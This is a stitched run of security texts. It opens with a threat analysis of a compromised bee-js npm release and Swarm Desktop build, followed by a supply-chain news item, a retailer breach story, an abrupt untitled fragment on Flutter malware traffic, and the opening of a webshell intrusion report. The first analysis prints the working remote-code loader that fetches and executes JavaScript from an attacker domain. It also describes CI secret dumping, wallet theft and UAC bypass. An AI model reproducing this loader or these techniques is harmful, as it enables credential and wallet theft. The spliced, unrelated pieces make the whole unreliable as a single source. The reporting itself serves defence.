Title: Malicious bee-js npm Release and Swarm Desktop Releases Deliver SleepyDuck Ethereum C2 Backdoor
Context: Gatekeeper therefore shows only the normal first-launch prompt
Full Text:
Socket’s Threat Research Team analyzed the November 9, 2026 compromise of Ethersphere’s release pipeline, in which a threat actor used the project’s own GitHub automation to publish a malicious @ethersphere/bee-js 13.3.0 to npm and a trojanized Swarm Desktop 0.56.2 release on GitHub. Both artifacts carry a small loader that fetches JavaScript from api[.]frameworkmetrics[.]xyz and executes it with full Node.js privileges. The Ethereum smart contract that tells the later stages where to connect, the wallet that controls it, and the stage-3 implant files are the same ones Pluto Security documented on October 1, 2026 in its analysis of the SleepyDuck / EtherDuck Open VSX campaign. npm removed 13.3.0 about 75 minutes after it was published; the Swarm Desktop release stayed up for about eight and a half hours.

@ethersphere/bee-js 13.3.0 (npm): scripts/generate-version.cjs was rewritten into a remote-code loader and promoted to a postinstall hook. The package was published by Ethersphere’s legitimate trusted-publishing workflow with valid SLSA provenance, and the loader ran three times inside that publishing job.

Swarm Desktop 0.56.2 (GitHub release): all nine Linux, macOS and Windows packages come from the same CI run, and every one we unpacked contains the same loader in the Electron main process. The macOS build is signed with the project’s Developer ID and notarized by Apple, and the release became available to Apple Silicon and Windows x64 users through the app’s auto-updater.

Shared infrastructure with SleepyDuck / EtherDuck: the loaders’ later stages read their command-and-control (C2) address from Ethereum contract 0xf8a900Db50b3331be6B768bA460BB59f3E40C344, which has been maintained by the same wallet since March 2026 and was previously used by malicious Solidity extensions on Open VSX.

SafeDep published a detailed public analysis of this incident. This post focuses on how the threat actor got in, how the release pipeline was used, what the loaders do, and the link to the earlier Open VSX campaign.

Background #

@ethersphere/bee-js is the JavaScript client library for Bee, the node software of the Swarm decentralized storage network. It averaged about 470 npm downloads a day in early November 2026 and is used by Ethersphere’s own tools (swarm-cli, bee-dashboard, create-swarm-app) and by third-party Swarm applications. Swarm Desktop is Ethersphere’s Electron application that installs and runs a Bee node, including the node’s Ethereum wallet, on macOS, Windows and Linux.

Both projects release through GitHub Actions. bee-js has published to npm with trusted publishing (OIDC, no long-lived npm token) since January 2026, and Swarm Desktop builds, signs and notarizes its installers in CI.

How the Threat Actor Got In #

The November 9 releases were not the start. Two days earlier the same actor tried and failed to harvest credentials from Ethersphere’s CI, then abandoned the attempt. The November 9 compromise used access already held.

Socket’s analysis indicates two GitHub accounts were compromised: nugaon, a maintainer who authored swarm-cli’s initial commit in 2021 and still held force-push rights to an unprotected master in 2026, and bee-worker, the release automation identity. Both appear as push actors in GitHub’s activity logs, which are derived server-side from the authenticating credential. Because the November 6 harvest failed, neither credential came from it — the origin of both compromises predates November 6 and remains unexplained.

November 6: Failed Secret Harvesting

All times UTC.

17:06:33 — swarm-desktop, branch probe/force-dryrun-1793984793: write-access probe at an existing commit, carrying no payload.

17:12:25 — swarm-desktop, branch security/lab-secrets-1793985145: workflow_dispatch secret dump.

17:14:35 — swarm-desktop, branch test-run: the same payload, renamed.

18:01:14 — swarm-cli, master: workflow_dispatch secret dump, reverted at 18:05:46.

18:42–19:55 — swarm-cli, master: exfiltration injected into the existing check.yaml (on: push), revised ten times.

The numeric suffixes are Unix epochs matching each branch’s creation time, indicating the names were generated programmatically.

All three workflows are the same tool: each dumps the full secrets and vars contexts via ${{ toJSON(secrets) }} and POSTs them to the same webhook[.]site collector, which is what makes this one campaign rather than two incidents. After the standalone workflows failed, the actor injected the payload into swarm-cli’s existing check.yaml as a step named sudo apt update, then revised it eleven times in 72 minutes across three collectors and a pastebin[.]com second stage. The targets narrowed from the whole secrets context to GitHub PATs, then to Apple and Windows code-signing material, and finally to NPM_TOKEN. Most of the individually named secrets appear nowhere in swarm-cli’s workflows, including code-signing material that belongs to a desktop application rather than a command-line tool. An undefined secret resolves to an empty string in GitHub Actions, so the enumeration reflects guesswork rather than knowledge of what the repository actually held. At 19:55:47 UTC the actor restored master and never returned.

No Evidence of Exfiltration

All three collectors remain readable. Across 38 captured requests, no request carries a body — content, query and files are empty and size is 0 on every entry — and no Microsoft Azure address appears, the range GitHub-hosted runners egress from. The collector that received the NPM_TOKEN payload logged nothing at all.

Three of the four attempts could not have run: workflow_dispatch workflows are only triggerable from a repository’s default branch, and the swarm-desktop pair sat on feature branches. The check.yaml injections should have executed, and Socket could not determine why they produced no data; Actions is currently disabled on swarm-cli, so its run history is unavailable for review.

Socket assesses with moderate confidence that nothing was exfiltrated. Two of the three collectors retain their full November 6 history, including the actor’s own browser visits, making selective deletion unlikely; the empty third remains ambiguous.

Authorship Is Not Attribution

Every malicious commit was authored as lab-bot or bee-worker and is unsigned. Author fields are client-set and worthless as evidence: lab-bot is fabricated and its noreply address is malformed, while bee-worker was copied verbatim from public history. Ethersphere’s genuine release commits are created through GitHub’s API and carry a Verified badge. What identifies the actor is the push event, and swarm-cli’s activity log attributes all thirteen November 6 pushes to nugaon.

Malicious bee-js 13.3.0 #

A Version Generator Turned Into a Loader

At 23:59:54 UTC on November 8 (client-set time), an unsigned commit, de2f74e, authored as the project’s release identity bee-worker, modified four files: CHANGELOG.md, package-lock.json, package.json and scripts/generate-version.cjs. The commit copies the title of an open pull request created by release-please, a tool that automates software releases (“chore(upcoming): release 13.3.0”), but does not belong to any branch and was never submitted through a pull request.

Two edits to package.json were needed for the loader to run on consumer machines. The files list gained scripts, so the script ships in the tarball for the first time, and the existing prepare hook was renamed to postinstall with the same command:

"files": [ "dist", "scripts" ], "scripts": { "prepublishOnly": "NODE_ENV=production npm run build", "postinstall": "node scripts/generate-version.cjs",

This is the first install-time hook in the package’s npm history: none of the other 177 versions in the packument declares one.

The script itself still does its original job of generating src/version.ts from the engines field, but the threat actor inserted a block at the top of scripts/generate-version.cjs that runs first and unconditionally:

try { const req = require('https').get( '<https://api.frameworkmetrics.xyz/v1/analytics>', { headers: { 'User-Agent': process.platform, 'X-Ethersphere': '1', }, timeout: 3000, }, async res => { let body = '' for await (const chunk of res) body += chunk new Function('require', 'console', 'process', body)(require, console, process); }, ) req.on('error', () => {}).on('timeout', () => req.destroy()) } catch {}

The request sends the operating system as the User-Agent and a gate header, X-Ethersphere: 1. There is no environment, CI, locale or time check. Whatever the server returns is compiled with new Function and called with the real require, console and process, so the downloaded code runs in-process with the installing user’s privileges and can load any Node.js module. The response status, content type and size are never checked. The sink line is also the only semicolon-terminated statement in a file that otherwise follows the repository’s semicolon-free Prettier style.

The surrounding comments frame the hook as code generation and the request as an “analytics ping”. The header comment says the script “must NEVER fail an install”, and a later comment explains that the script uses return rather than process.exit so it does not kill the ping. That early return fires on every consumer install, because published tarballs ship no src/ directory, and it keeps the process alive until the download finishes.

The “never fail” promise is only partly true. Request-level errors (DNS failure, TLS failure, no response within three seconds) are swallowed and the install succeeds silently. Errors after the response starts are not covered by the try block: a body that is not valid JavaScript, a payload that throws, or a stalled transfer becomes an unhandled promise rejection, which ends Node.js 15 and later with exit code 1 and fails the install. A failed install is therefore not evidence that a machine was spared, because the request has already been sent.

Package manager defaults matter here. npm 11 and earlier, Yarn Classic, and Yarn Berry before 4.14.0 run dependency postinstall scripts by default. npm 12, pnpm 10 and later, Yarn Berry 4.14.0 and later, Bun and Deno skip unreviewed dependency scripts by default, so on those clients the loader does not run unless the project allowlisted it.

The Loader Ran Inside Ethersphere’s Publishing Job

At 00:06:01 UTC on November 9, bee-worker published a GitHub release for an unsigned annotated tag v13.3.0 pointing at de2f74e. The release event started the project’s Publish on npm workflow. That workflow runs its test, check and entrypoint jobs only on push events, and its publish job explicitly accepts release events with those jobs skipped:

publish: needs: [tests-stable, tests-rc, check, entrypoint] # Publish on a release (CI jobs are skipped there), or on an `upcoming` push only when every # CI job succeeded. `!cancelled()` lets the job evaluate even though the needed jobs are # skipped on the release path. if: >- !cancelled() && (github.event_name == 'release' || (needs.tests-stable.result == 'success' && needs.tests-rc.result == 'success' && needs.check.result == 'success' && needs.entrypoint.result == 'success')) runs-on: ubuntu-latest environment: publish

Nothing in the workflow checks that the released commit belongs to the protected upcoming branch, and the publish environment has no required reviewers or tag policy. The deployment went from creation to success in 73 seconds with no approval step. No npm token was needed: the legitimate workflow, running legitimate workflow code from the tag, published the threat actor’s commit.

Because the build itself calls the rewritten script, and package.json now also declared it as postinstall, the loader ran inside this job, which has id-token: write permission for trusted publishing. The public job log shows three executions (the root postinstall during npm ci, npm run build, and the prepublishOnly build during npm publish), and each is followed a few hundred milliseconds later by a line that exists nowhere in the package, the repository or any other run’s log:

2026-11-09T00:06:19.9251494Z > node scripts/generate-version.cjs 2026-11-09T00:06:19.9251720Z 2026-11-09T00:06:19.9741926Z Generated src/version.ts from package.json engines 2026-11-09T00:06:20.3545705Z [FrameworkMetrics] analytics v2.3.1 is up to date

The C2 server therefore answered Ethersphere’s GitHub-hosted runner with JavaScript at 00:06:20, 00:06:21 and 00:06:43 UTC, more than five and a half hours before the first payload capture recorded in SafeDep’s IOC list (05:43 UTC). What that JavaScript did beyond printing the line is not visible in the log. The published build was not altered: all 331 dist/ files in 13.3.0 are byte-identical to the legitimate 13.3.0-upcoming.g4568f7a pre-release built from the parent commit, and the only differences are package.json and the loader. Whether the served code read the runner’s environment or requested an OIDC token cannot be determined from public data. No other Ethersphere npm package had been published after 13.3.0 when we checked at 09:21 UTC.

npm received @ethersphere/bee-js@13.3.0 under the latest dist-tag at 00:09:50 UTC and removed it at 01:24:58 UTC. GitHub issued GHSA-hh7j-5m3j-23pf at 01:25:27 UTC.

The Provenance Was Genuine

The 13.3.0 provenance attestation is not forged. We verified the bundle offline end to end (DSSE signatures, Fulcio certificate chain, embedded SCT, Rekor inclusion proofs and the tarball’s sha512 digest). The signing certificate correctly names publish_npmjs.yaml@refs/tags/v13.3.0, commit de2f74e, the release trigger and the publish environment. The legitimate 13.2.0 attestation has exactly the same shape, so provenance alone could not have told the two releases apart. It proves where a package was built, not that the source was reviewed.

Trojanized Swarm Desktop 0.56.2 #

Built, Signed and Notarized by the Project’s Own CI

About 30 minutes after the npm publish, the same release identity created a branch named emergency/0.56.2 at commit 2de7270, and published GitHub release v0.56.2 (“emergency patch release”) as a full, non-draft release, all within seven seconds and before any build assets existed. The commit imitates a release-please release but bumps only package.json, leaving the release-please manifest at 0.56.1, and adds the loader to src/index.ts. The repository’s master branch was never touched.

The threat actor then dispatched pre-release.yml, a manually triggered workflow that takes a free-form branch input, has no environment protection and hands the build the Apple and Windows signing certificates, their passwords and the Apple ID used for notarization. That workflow had been broken since March 2026 because it never installed pnpm, so the first run failed. About two minutes after that failure, commit dc7d745 added the missing pnpm/action-setup step (a second run, started just before the fix was pushed, failed the same way). It carries a Co-authored-by: Cursor <cursoragent@cursor.com> trailer and, according to GitHub’s push record, was pushed through the nugaon account described above. The third run built, signed, notarized and uploaded all ten assets between 00:41:24 and 00:44:55 UTC, even though it ended with a “failure” status because a second macOS arm64 job failed code signing.

The Loader in the Electron Main Process

Every 0.56.2 package we unpacked (Linux deb and rpm for amd64 and arm64, the macOS arm64 zip, and the Windows Setup.exe, nupkg and zip) contains the same dist/desktop/src/index.js inside app.asar, with SHA-256 f81315968e679b48f6bdff1c9b928bb223230d07f44d7948412c2250c2a14deb. The arm64 DMG comes from the same CI job; we did not open it. Comparing against 0.56.1, exactly seven of the 6,769 files in the archive change; the other six are the source map, two version fields and pnpm metadata, and the only code change is a 731-byte insertion into index.js. The source change in 2de7270 adds an https import and the following block, shown here as compiled into index.js with surrounding context:

async function main() { logger_1.logger.info(`Bee Desktop version: ${package_json_1.default.version} (${process.env.NODE_ENV ?? 'production'})`); new Promise((resolve, reject) => { const req = node_https_1.default.request({ hostname: 'api.frameworkmetrics.xyz', port: 443, path: '/v1/electron', method: 'GET', headers: { 'User-Agent': process.platform, 'X-Ethersphere': '1', }, }, (res) => { let body = ''; res.setEncoding('utf8'); res.on('data', (c) => { body += c; }); res.on('end', () => new Function('require', 'console', 'process', body)(require, console, process)); }); req.on('error', reject); req.end(); }); const gotTheLock = (0, electron_2.runElectronTray)(); if (!gotTheLock) return;

The loader is the first action of main(), which runs unconditionally when the module loads. It fires at every launch of the app, before the single-instance lock, the splash window, the updater and app.whenReady, and it runs in the unsandboxed main process with the same new Function sink and the same two headers as the npm loader. It is not identical code: it uses a different path (/v1/electron), https.request instead of https.get, no timeout, and no error handling. A failed request rejects a promise nobody awaits, so an unreachable or misbehaving server likely produces Electron’s “A JavaScript error occurred in the main process” dialog rather than failing silently.

Swarm Desktop stores the Bee node’s config.yaml, which includes a plaintext password value, and the node key under data-dir/keys/ on every install, so the files that stage 2 targets (see below) are present on every affected machine.

Signed, Notarized and Pushed Through Auto-Update

The macOS app is signed “Developer ID Application: Swarm Association (9J9SPHU9RP)” with the same certificate as 0.56.1. The signature covers the trojanized archive: the ElectronAsarIntegrity value in the signed Info.plist equals the hash of the malicious app.asar header. Apple’s stapled notarization ticket, issued at 00:44:05 UTC, lists all 15 Mach-O code directory hashes in the bundle, none of which appear in 0.56.1. Gatekeeper therefore shows only the normal first-launch prompt. The Windows binaries carry an Authenticode signature made with the same Apple-issued certificate. That signature is mathematically valid, but Apple’s roots are not in Microsoft’s trusted root program, so Windows should treat it as untrusted (we did not test this on a Windows host). The Linux packages are unsigned and have no maintainer scripts; the loader runs when the app starts.

Swarm Desktop uses update-electron-app, which polls update.electronjs.org every ten minutes on macOS and Windows. That service ignores drafts and pre-releases, which is why publishing v0.56.2 as a full release mattered. Windows x64 clients could be offered 0.56.2 from 00:43:17 UTC and Apple Silicon Macs from 00:44:49 UTC. Intel Macs were never offered it because pre-release.yml has no Intel macOS job, and Linux packages do not auto-update.

Ethersphere maintainers deleted the v0.56.2 tag at 09:04 UTC and the release was no longer public by about 09:14 UTC. Deleting a release does not roll anyone back: the update service never offers an older version, so machines that already updated to 0.56.2 stay on it until a 0.56.3 or later release ships. As of 10:30 UTC on November 9, no 0.56.3 had been published.

Later Stages #

Stage 2: without the X-Ethersphere: 1 header the server returns a harmless decoy. With it, it returns plain JavaScript for the requesting operating system; the macOS and Windows payloads are the same on both endpoints, and Linux has one variant per endpoint. On both the npm and the desktop path, the payload looks for Swarm Desktop’s data directory and posts the node’s config.yaml and data-dir/keys/swarm.key to hxxps://api[.]frameworkmetrics[.]xyz/v1/swarm/report. The key file is an encrypted Ethereum keystore, but config.yaml holds its password in plain text, so the two files together hand over the node wallet. The payload then downloads the stage 3 for the host’s operating system and architecture from the /v1/assets/ path on the same server.

Stage 3 (macOS and Linux): a Go backdoor whose module is named evjawbreaker, written to ~/.solidity/ under its platform name (for example linux_amd64 or darwin_arm64) and started by ~/.solidity/.run.py (or ~/.solidity/.run.cjs on macOS when Node.js is present). It persists as systemd user unit solidity-langsupport-runner.service, which it repairs on every run if the unit was changed, or as LaunchAgent com.solidity.langsupport.runner, clearing the macOS quarantine attribute. It exits before connecting if it detects a debugger or a virtual machine. Otherwise it reads its hub address from the Ethereum contract through public RPC gateways such as rpc.ankr.com and cloudflare-eth.com, connects to the hub over TLS without validating the certificate, and runs the operator’s commands in a persistent sh pseudo-terminal.

Stage 3 (Windows): the payload first checks whether ScreenConnect is already installed, stages its files as %TEMP%\.stuffed-* and runs an obfuscated PowerShell loader, invoke.ps1. If the user is a local administrator, the loader uses UACME method 39 (COR_PROFILER) against mmc.exe to elevate without a prompt; otherwise it shows the UAC prompt again every time the user cancels it. With administrator rights it adds a Microsoft Defender exclusion, silently installs a genuine, ConnectWise-signed ScreenConnect 25.4.3 client configured for relay 185[.]232[.]84[.]169:8041 with its tray icon and connection banners hidden and sessions starting without asking the user, then removes the exclusion and the staging files. The client runs as the SYSTEM service ScreenConnect Client (5cbe79c9c25524df).

The “Solidity language support” names make little sense for Swarm users. They are carried over unchanged from the Open VSX campaign described next.

Infrastructure: an Ethereum Dead Drop Shared With SleepyDuck #

Contract 1 and Its Write History

Contract 0xf8a900Db50b3331be6B768bA460BB59f3E40C344 on Ethereum mainnet is a minimal configuration store. param1() (selector 0x02d91518) returns the hub address and param2() (selector 0x1f049b68) returns a payload URL; only the owner, 0xFd3fc58bcbd8ccc77b6000201438eDfc636E7cA7, can change them. Because the values are plain ABI strings in transaction calldata, the full history can be decoded:

March 14, 2026: the contract is deployed 13 minutes after the owner wallet is funded. The first hub value is hxxp://localhost:4912, an operator test, followed 40 minutes later by 107[.]189[.]16[.]215:4912.

March 28 to 29: hub 91[.]108[.]240[.]156:4912 and payload URL hxxp://91[.]108[.]240[.]156:3000/app[.]js.

May 3 and May 16: hub 107[.]189[.]27[.]46:4912 and payload URL hxxp://107[.]189[.]27[.]46:3000/app[.]js, which is still the current param2.

July 31: hub 107[.]189[.]27[.]223:4912.

September 23 and 24: hub 178[.]16[.]54[.]222:4912, then 193[.]57[.]9[.]17:4912.

November 8, 23:30:47 UTC: hub 193[.]57[.]9[.]155:4912, written 29 minutes before the malicious bee-js commit.

The loader domain frameworkmetrics[.]xyz was registered on November 6, 2026 at 15:08 UTC through NICENIC with Cloudflare nameservers, about 57 hours before the bee-js commit.

The Same Operator as SleepyDuck / EtherDuck

On October 1, 2026, Pluto Security published an analysis of “EtherDuck”, two waves of malicious Open VSX extensions that impersonated the juanblanco.solidity and NomicFoundation.hardhat-solidity extensions between September 24 and 26, 2026, and that Pluto attributes to the actor behind the 2025 SleepyDuck campaign. Those extensions read their configuration from the same contract, owned by the same wallet. Several independent points tie the two operations together:

Pluto’s on-chain timeline for the contract (deployment plus two changes on March 14, three changes on March 28 and 29, two in May, one on July 31, two on September 23 and 24) matches our decoded history write for write. Pluto’s hub value 193[.]57[.]9[.]17:4912 is the value the contract held until November 8. The November 8 write is the only one made after Pluto’s report.

The two September changes landed about 25 and 6 hours before the first EtherDuck listings went live, and the May 3 hub change came two days after the earlier juannegro.solidity listing was published on May 1. Not every change lines up with a known wave: the March changes preceded the first known listing by weeks, and Pluto found none for July 31.

Six of the seven payload hashes Pluto published (the four Go backdoor builds, the PowerShell loader and the ScreenConnect installer) are the same six files SafeDep downloaded from the bee-js C2’s /v1/assets/ path on November 9. The Go builds were reused unchanged (Pluto found the same builds in both the spring and September waves): the implant looks up its hub in the contract at runtime, so a new contract value was enough to point it at new infrastructure.

The persistence names (~/.solidity/, com.solidity.langsupport.runner, solidity-langsupport-runner.service), the ScreenConnect instance 5cbe79c9c25524df and relay 185[.]232[.]84[.]169:8041 are identical.

Pluto did not find a distribution wave for the July 31 change. The chain suggests a reason: that day a second wallet, 0xA7B15A2B5F6992DC3BabB946375d6895fF1171BF, deployed a second contract, 0x6a82595EEea0f4FDFB3aE13A2687BcbBE626e94B, with the same getter selectors but renamed setters, and values that appear to be encoded with a per-slot substitution cipher. The two wallets are linked directly: the first wallet sent calldata to the new contract that was byte-identical to the second wallet’s successful transaction 72 seconds later, and both were funded by the same high-volume payout wallet, most likely an exchange or swap service. Our partial decode of the second contract’s values points to a public IP address on port 4444 and a payload URL on the same host, but we found no client that reads it.

Taken together, the same operator moved from fake developer extensions that a victim had to find and install, to compromising a real project’s release pipeline and shipping through npm trusted publishing and an Apple-notarized desktop app. The target profile, developers working with Ethereum tooling and wallets, did not change.

Impact #

bee-js: @ethersphere/bee-js had 3,741 downloads between November 1 and 8. Version 13.3.0 was on the registry as latest for about 75 minutes, and per-version counts for it are not available; based on daily traffic, we estimate on the order of ten fetches of 13.3.0, including scanners and mirrors. Any project that installed it, or freshly resolved a dependent with a ^13 range, during that window with install scripts enabled ran the loader. Dependents whose published ranges admit 13.3.0 include @ethersphere/swarm-cli 3.6.0 and 3.7.0, @ethersphere/bee-dashboard 0.37.0 and 0.37.1, @snaha/swarm-id 0.5.0 to 0.8.0, @solarpunkltd/file-manager-lib 1.1.0 and 1.1.1, and bee-wasm-js 0.1.0 and 0.1.1, plus new create-swarm-app projects. @ethersphere/bee-dashboard 0.33.0 to 0.36.2 also reach it indirectly through @solarpunkltd/file-manager-lib. A CI job that installed it ran the loader with that job’s environment and, where granted, its OIDC token capability.

Swarm Desktop: the v0.56.2 download counters reached 65 by 08:27 UTC, including 22 downloads of the darwin-arm64 zip that the macOS updater fetches and 3 of the Windows nupkg. These are upper bounds that include researchers. Every affected machine requested stage 2 at every app launch, and ran it whenever the C2 answered.

Data and access at risk: the Bee node password and wallet key (and with them any node balance, chequebook or stake), anything the installing user or CI job could read, and, per the reported stage 3, persistent remote shell access on macOS and Linux and unattended ScreenConnect access on Windows.

Residual copies: at 10:30 UTC on November 9 the Huawei Cloud npm mirror still served the malicious bee-js-13.3.0.tgz with matching checksums, and GitHub still served source tarballs of the malicious commits by SHA.

Recommendations #

For bee-js Users

Search lockfiles, package-manager caches and internal registries for @ethersphere/bee-js@13.3.0 or integrity sha512-ltkrphoNy7TBIjCICDW7y3qa+j8yljt3+ohPRSM+id1rK2NaOgm5H5V/FioTQ0rEJ5IJ+Zj1micbAdQCqqc8iw== and pin 13.2.0. Purge cached copies, including any mirror you install through.

Treat any developer machine or CI job that installed 13.3.0 with scripts enabled between 00:09:50 and 01:24:58 UTC on November 9 as having run the threat actor’s code, even if the install failed. Rotate credentials reachable from those environments, including cloud credentials obtainable through CI OIDC trust.

On npm 11.16 through 11.21, CI and terminal logs name @ethersphere/bee-js@13.3.0 (postinstall: node scripts/generate-version.cjs) in an install-scripts warning, and npm debug logs record an info run line for the same script.

For Swarm Desktop Users

Check whether 0.56.2 ever ran: each launch writes Bee Desktop version: 0.56.2 (production) to bee-desktop.log before the loader executes.

Uninstall 0.56.2 and install 0.56.3, the clean replacement release. macOS and Windows clients should also receive 0.56.3 automatically through the auto-updater, but check the installed version rather than waiting for it; Linux packages do not auto-update and must be replaced manually.

Assume the node password and key were stolen. Move node wallet funds, chequebook and stake to a new key from a clean machine.

Look for ~/.solidity/, the com.solidity.langsupport.runner LaunchAgent, the solidity-langsupport-runner.service user unit and the ScreenConnect Client (5cbe79c9c25524df) service. Reinstalling the app does not remove them.

For Maintainers

Do not let a release event publish without proof that the released commit is on a protected branch or came from a merged release pull request. Run that check inside the publishing workflow, because trusted publishing and provenance will faithfully sign whatever the workflow builds.

Put the publishing environment behind required reviewers and restrict which tags can deploy to it. Use repository rulesets to restrict tag and release creation.

Do not skip tests on the release path, and do not expose signing certificates and notarization credentials to manually dispatched workflows that accept an arbitrary branch input.

Treat a release-bot identity’s token as a publishing credential: scope it narrowly, rotate it, and alert on releases that bypass the normal release-please flow.

For Security Teams

Hunt DNS and proxy logs for api[.]frameworkmetrics[.]xyz and for connections to the hub and relay addresses below.

Where RPC traffic is visible (TLS inspection or endpoint telemetry), hunt for eth_call requests to 0xf8a900Db50b3331be6B768bA460BB59f3E40C344 with data 0x02d91518, in particular from binaries under ~/.solidity/. This would flag the backdoor regardless of whether it arrived through npm, Swarm Desktop or an Open VSX extension.

Watch the contract for new writes. It emits no events, so poll its getters or storage rather than waiting for logs.

Title: New Supply Chain Attack Compromises Tens of Thousands of GitHub Repositories
Context: Security researchers at Socket have uncovered a new software supply chain attack that has affected tens of thousands of GitHub repositories, including organization-owned ones
Full Text:
Security researchers at Socket have uncovered a new software supply chain attack that has affected tens of thousands of GitHub repositories, including organization-owned ones.

Uber is mentioned as one of the businesses that runs compromised packages. The kill chain is reminiscent of GhostAction, a malicious campaign discovered by GitGuardian in September 2025 and reappeared in October 2026.

Malicious Workflow Spread Via Two GitHub Accounts

On October 8, 2026, two GitHub accounts, ‘henrywoo’ and ‘kitao,’ pushed a malicious GitHub Actions workflow to hundreds of repositories they had permission to modify.

A GitHub Action is an automated task that runs in a GitHub repository to handle activities such as testing code, building software or deploying applications whenever specific events occur.

The workflow, named “.github/workflows/security-audit.yml,” was added through a single-file commit designed to look routine, “Add security audit workflow” and “Update security audit workflow.”

Despite its name, the workflow does not perform any security checks. Instead, it steals credentials from affected repositories and sends them to an external server at 193.32.204[.]199 over HTTP.

Because the workflow looks like a legitimate security tool, it can go unnoticed while running as part of the repository's automated processes.

According to Socket researchers, the malicious file was found in tens of thousands of repositories, which include ones where ‘henrywoo’ or ‘kitao’ have write access.

Infection vectors include the following repositories:

henrywoo/pyllama and henrywoo/chatllama, AI GitHub projects created by ‘henrywoo’

kitao/pixel, typically distributed through both Python Pacjkage Index (PyPI) and crates.io, online repositories where developers publish and distribute software packages written in Python and Rust, respectively

uber/athenadriver, an Uber-owned project where ‘henrywoo’ has write access as its original author

Even repositories that had been inactive for a decade were affected, suggesting the attackers systematically enumerated every repository they could access instead of choosing targets based on their activity or value.

The activity appears automated rather than manually targeted.

Expanding GhostAction’s Secret Theft Capabilities

While the incident is a new variation of the GhostAction campaign, Socket researchers noted that this latest version expands what the attackers can steal.

Earlier GhostAction attacks primarily targeted secrets stored in GitHub Actions, such as API keys and access tokens configured for automated workflows.

The new variant also searches the repository's files and complete Git history for credentials using regular-expression patterns. This means it can find sensitive information that developers accidentally committed to source code, configuration files or earlier versions of files, even if those credentials have since been deleted from the latest version of the repository.

The additional search targets credentials for cloud providers and AI services, potentially exposing access to infrastructure, hosted applications and third-party services.

Malicious Workflow Still Active in GitHub Repositories

As of October 9, 2026, Socket reported that the malicious workflow was still present on the default branches of the repositories it examined, including uber/athenadriver and kitao/pyxel.

The workflow had also successfully executed in affected repositories, meaning the credential-stealing activity was not limited to an attempted injection.

However, the researchers had not observed any malicious package versions published to PyPI or crates.io as a result of the campaign at the time the Socket report was published.

This does not mean the stolen credentials have not been used for other purposes, only that Socket had not identified evidence of follow-on malicious package releases on those two registries.

Full Text: Toilet paper purveyor Who Gives A Crap has found itself in a bit of a mess after an intruder accessed customer information through a third-party software provider, leaving the company scrambling to clean up a breach affecting shoppers in the UK, US, and Australia. In an email sent to affected customers over the weekend, seen by The Register, the loo roll seller warns that personal information was accessed without authorization after a security incident at an unnamed US-based marketing software provider. The email explains that the intruder gained access to the supplier's systems on October 30. The provider spotted the intrusion the following day and says it secured its systems by November 1, although Who Gives A Crap wasn't told until November 6. It's unclear why the supplier sat on the bad news for another five days before passing it on. The exposed information includes customers' names, email addresses, phone numbers, mailing addresses, and total spending with the company. In other words, someone may now know not only where you live, but just how much of your hard-earned cash you've flushed down the crapper. Payment information, order details, and passwords were not involved, and customers' accounts were not directly accessed. That's something of a relief, although whether the intruder actually made off with the data remains a pressing question. "We don't yet know whether the information was copied or downloaded," the company told customers, adding that it had found no evidence of misuse. In a separate public statement, Who Gives A Crap co-founder and CEO Simon Griffiths confirmed that the incident affected customers across the company's Australian, UK, and US stores. Canadian customers, meanwhile, appear to have escaped this particular toilet emergency, with the supplier reporting that no personal information belonging to shoppers in the country was accessed. Who Gives A Crap says it has since disconnected the provider from its systems, changed access credentials, and begun warning affected customers to watch out for suspicious emails, texts, calls, and other unsolicited communications. "The main concern is scam or phishing messages that use your real details to look convincing," the company warned in its customer email. While Who Gives A Crap has been busy cleaning up, the supplier at the center of this particular stink remains a mystery. The company hasn't identified the software provider or disclosed how many customers were affected, including those in the UK, and didn’t respond to our questions. Griffiths said the company is "engaging with the relevant regulatory authorities, as required." In the UK, the ICO told The Register: "We can confirm Who Gives A Crap Limited has reported an incident and we are assessing the information provided." Who Gives A Crap has plenty of toilet paper to hand, although cleaning up this particular situation might require more than a few rolls. ®

Game Server Communication

All communication with the game servers is authenticated and encrypted. The AES encryption key is included in the /srvlist response from the line configuration servers (field aes_key). For authentication, all requests are signed with HMAC-SHA256, a keyed hash message authentication code that computes the hash of a message and a shared secret (the AES key in our case).

Because the AES key is returned in cleartext from the line config servers, the purpose is not to address confidentiality or integrity against a third party, but rather to obfuscate content and check for communication errors.

Conclusion

This malware is not “garage” or student-level work. It reflects well-planned development, with a clean infrastructure, multiple REST APIs, and a full ecosystem. In 2024, with limited reverse engineering tooling, this Flutter application would have taken ages to reverse engineer. In 2026, however, it’s merely a hard day’s work. Title: Inside an AhsayCBS Intrusion: Hidden Webshells, a CryptoMiner, and a C2 Implant
Context: Background In early October, Huntress began seeing threat actors exploit two flaws in AhsayCBS, the management console for Ahsay's backup software: CVE-2026-105133, an...
Full Text:
Background

In early October, Huntress began seeing threat actors exploit two flaws in AhsayCBS, the management console for Ahsay's backup software: CVE-2026-105133, an authentication bypass, and CVE-2026-105134, unauthenticated remote code execution as SYSTEM through /rps/api/json/UpdateReceivers.do. Our original blog post covered the first wave: webshells, an XMRig miner dressed up as Microsoft Edge, and a script that hid the miner from Task Manager. Ahsay has since released hotfixes (10.3.4.45 for v10, and 9.15.2.70 for v7 through v9), and we verified that 10.3.4.45 blocks the entry point we saw.

The impacted organization's servers in this post were exploited between October 8 and October 11, 2026, which was before Ahsay released its hotfixes. During our investigation into the attack, we analyzed webshells, loaders, and an implant that the threat actor used during the attack.

This activity matches the campaign in our first post. We tied it to AhsayCBS exploitation because the webshells sat inside AhsayCBS's own web directories, the AhsayCBS access logs show an exploit source address that is listed in that post, and one of the servers also held files matching that post's indicators.

When organizations apply hotfixes, it mitigates the issue moving forward, but if a compromise has already happened it does not remove files an actor has already planted. If your AhsayCBS servers were exposed before patching, it's worth searching your environment for the artifacts in this post.

What we found, at a glance

Our initial report described incidents that involved a quick smash and grab: a webshell or a few commands, then a miner. However, this incident reflects a much larger intrusion with more patience; the operator planted shells in several places, ran two different miners, staged tunneling tools, and installed a custom implant, all on servers whose job is to hold backups. The rest of this post takes apart the pieces one at a time.

Figure 1: An overview of what the operator left on the exploited servers

Webshells, in several flavors

Overall, we saw five webshell families during our investigation (seen in the table below), all with varying parameters and characteristics.

One of the most common webshells we found in this environment was small in size: it compared a hardcoded key in the p parameter against its own copy and returned a plain 404 if the key is wrong, so a scanner that does not know the key would see an empty page. With the right key, the c parameter would be passed to cmd.exe /c and the output would come back Base64-encoded.

The second webshell family included w and d parameters, which were designed to write Base64-decoded bytes to any path the service account can reach and make it easy to drop more tools. Every file carried its own key (always 12 hex characters followed by a capital P).

